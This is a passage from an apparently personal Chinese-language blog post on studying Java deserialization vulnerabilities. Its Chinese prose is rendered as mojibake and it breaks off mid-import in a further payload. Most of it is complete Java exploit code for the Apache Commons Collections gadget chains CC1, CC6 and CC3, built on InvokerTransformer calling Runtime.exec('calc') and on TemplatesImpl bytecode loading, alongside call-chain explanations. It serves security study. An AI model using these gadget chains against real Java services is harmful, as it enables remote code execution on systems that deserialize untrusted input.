</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/06/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/">javaååºåˆ—åŒ–å­¦ä¹ ï¼ˆäºŒï¼‰</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-17</time><div class="content"><h2 id="ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´åŸç†"></a>ååºåˆ—åŒ–æ¼æ´åŸç†</h2><p>1ã€æ¥å—ä»»æ„å¯¹è±¡</p>
<p>2ã€æ‰§è¡ŒreadObjectæ–¹æ³•</p>
<p>javaååºåˆ—åŒ–è°ƒç”¨æ—¶ä¸€å®šä¼šè°ƒç”¨readObjectæ–¹æ³•ï¼Œç”±äºreadObjectæ˜¯å¯ä»¥é‡å†™çš„ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡ä¼ é€’ä¸€äº›å±é™©çš„å¯¹è±¡ä»è€Œè°ƒç”¨å±é™©çš„æ–¹æ³•</p>
<p>å¯ä»¥åˆ©ç”¨ä¸åŒç±» çš„åŒåå‡½æ•°</p>
<p>ä»»æ„æ–¹æ³•è°ƒç”¨ï¼ˆåå°„/åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼‰</p>
<p>readObject()æ–¹æ³•çš„ä½œç”¨æ­£æ˜¯ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ï¼ŒreadObject()æ˜¯å¯ä»¥é‡å†™çš„ï¼Œå¯ä»¥å®šåˆ¶ååºåˆ—åŒ–çš„ä¸€äº›è¡Œä¸ºã€‚</p>
<p><strong>æ³¨æ„</strong></p>
<p>å…¥å£ç±»è¦å¯åºåˆ—åŒ–ï¼ŒåŒæ—¶é‡å†™äº†readObjectï¼Œæ¥å—ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°</p>
<h2 id="cc1é“¾"><a href="#cc1é“¾" class="headerlink" title="cc1é“¾"></a>cc1é“¾</h2><p><strong>ç¯å¢ƒ</strong></p>
<p>éœ€è¦jdk-8u65</p>
<p>mavenéœ€è¦3.2.1</p>
<p>åˆ©ç”¨ç‚¹ï¼šTransformerç±»ï¼›åˆ©ç”¨invoketransformerå†…éƒ¨çš„Transformerç±»ä»è€Œåˆ©ç”¨åå°„ï¼Œå®ç°å±é™©å‡½æ•°åˆ©ç”¨ã€‚</p>
<p><strong>æ¼æ´åˆ©ç”¨è¿‡ç¨‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//        Runtime r = Runtime.getRuntime();</span><br><span class="line">//        Class runtime = Runtime.class;</span><br><span class="line">//        Method getRuntimeMethod = runtime.getMethod(&quot;getRuntime&quot;,null);</span><br><span class="line">//        Runtime a = (Runtime) getRuntimeMethod.invoke(null,null);</span><br><span class="line">//        Method execMethod = runtime.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">//        execMethod.invoke(a,&quot;calc&quot;);</span><br><span class="line">//        Method getRuntimeMethod =(Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="line">//        Runtime a= (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="line">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(a);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">//        chainedTransformer.transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        Class c = Runtime.class;</span><br><span class="line">//        Method calcmethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">//        calcmethod.invoke(r,&quot;calc&quot;);</span><br><span class="line">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(&quot;value&quot;, &quot;aaa&quot;);</span><br><span class="line">        Map&lt;Object, Object&gt; Map = TransformedMap.decorate(hashMap, null, chainedTransformer);</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        Object o = constructor.newInstance(Retention.class, Map);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ•´ä½“æ€è·¯</strong></p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; ä»£ç æ‰§è¡Œ</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ç”±äºRuntime.getRuntime.exec();æ— æ³•ååºåˆ—åŒ–ï¼Œå› æ­¤éœ€è¦åå°„</p>
<p><img src="https://img-blog.csdnimg.cn/01d9bc03454b42579f6cb65c16daeaf7.png#pic_center"><br>å…·ä½“æƒ…èŠ‚å¯ä»¥å‚è€ƒ</p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-2/#%E6%80%BB%E7%BB%93">cc1(1)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/122277578">cc1(2)</a></p>
<p><a target="_blank" rel="noopener" href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">cc1(3)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bf5252f16d46d7c835443b27896d7f4c">cc1(4)</a></p>
<h2 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h2><p>æµç¨‹ï¼šï¼ˆä¸‹æ–¹é‚£ä¸ªï¼Œä¸Šæ–¹çš„ä¸ºcc1ï¼‰</p>
<p><img src="https://img-blog.csdnimg.cn/91153f76f8074e9d8c3f8df1829310de.png#pic_center" alt=" "></p>
<p>ä¼˜ç‚¹:ä¸å—javaç‰ˆæœ¬æ§åˆ¶ï¼Œä»»ä½•ç‰ˆæœ¬çš„javaéƒ½å¯ä»¥ä½¿ç”¨è¯¥é“¾å­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry a = <span class="keyword">new</span> <span class="function">TiedM	<span class="title">apEntry</span><span class="params">(lazyMap, <span class="string">&quot;aaa&quot;</span>)</span></span>;</span><br><span class="line">        HashMap&lt;Object, Object&gt; b = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        b.put(a, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="comment">//ä¸ºäº†é˜²æ­¢åœ¨åºåˆ—åŒ–æ—¶å°±è°ƒç”¨æ•´ä¸ªé“¾å­å› æ­¤å¯¹lazyMapè¿›è¡Œåå°„ï¼Œä»¤åˆšå¼€å¼€å§‹çš„å€¼ä¸ä¸ºchainedTransformerï¼Œä¹‹åé€šè¿‡åå°„åœ¨ä¿®æ”¹ä¸ºchainedTransformerï¼Œä»è€Œè¾¾åˆ°åœ¨åºåˆ—åŒ–æ—¶ä¸ä¼šåˆ©ç”¨æ•´ä¸ªé“¾å­</span></span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factoryfield = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factoryfield.set(lazyMap,chainedTransformer);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//ä½¿å¾—åœ¨åºåˆ—åŒ–æ—¶putè°ƒç”¨æ—¶ç»™lazyMapæ·»åŠ çš„å€¼åˆ æ‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(b);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.yongsheng.site/2022/01/26/CommonsCollections-6/">å‚è€ƒ</a></p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>åˆ©ç”¨å¦ä¸€ç§æ–¹æ³•  ç±»çš„åŠ¨æ€åŠ è½½</p>
<p>åœ¨ç±»åŠ è½½æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ã€</p>
<p>Classloader-&gt;findClass-&gt;defineClass-&gt;Templateslmpï¼ˆè°ƒç”¨newinstanceç±»ï¼‰- &gt;getTransletInstance()</p>
<p>ç”±äºåœ¨Templateslmpç±»å†…éƒ¨æœ‰ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬é€ä¸ªåˆ†æï¼Œç„¶åå‘ç°ç¬¬ä¸‰ä¸ªå¯ä»¥è¾ƒå¥½åˆ©ç”¨</p>
<p><img src="https://img-blog.csdnimg.cn/9894ce67eb414e2f92b38cc9bd44a0c4.png#pic_center"></p>
<p>ç”±äºåœ¨ç¬¬ä¸‰ä¸ªä¸­å­˜åœ¨newinstance,å¯ä»¥åˆå§‹åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/c4cdce0d99fc43df9b2b67aae34412c2.png#pic_center"></p>
<p>å› æ­¤é€‰æ‹©è¿™ä¸ªæ¯”è¾ƒåˆé€‚</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class tc = templates.getClass();</span><br><span class="line">        Field nameField = tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes  = tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        Field tfactoryField = tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(templates),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        Class c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,h);</span><br><span class="line">        Object o = constructor.newInstance(Override.class,proxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆåŠŸ</p>
<p><img src="https://img-blog.csdnimg.cn/c378ae6bb59f4c29959bcba2f7464594.png#pic_center"></p>
<p>å¤§è‡´æ€è·¯ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/ffcd9d7bf6a449349a393b5cb860db84.png#pic_center"></p>
<p> è¿™ç§æ–¹æ³•å¯ä»¥ç”¨äºRuntimeè¢«è¿‡æ»¤æ—¶å€™ä½¿ç”¨</p>
<p>è¿˜æœ‰<strong>å¦ä¸€ç§æ–¹æ³•</strong>ï¼Œå½“æˆ‘ä»¬ä¸æƒ³ä½¿ç”¨InvokeTransformæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘åˆ©ç”¨ä¸‹é¢çš„è¿™ä¸ªé“¾å­</p>
<p><img src="https://img-blog.csdnimg.cn/80e78c15d2994c44889f76188740674c.png#pic_center"></p>
<p>paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import 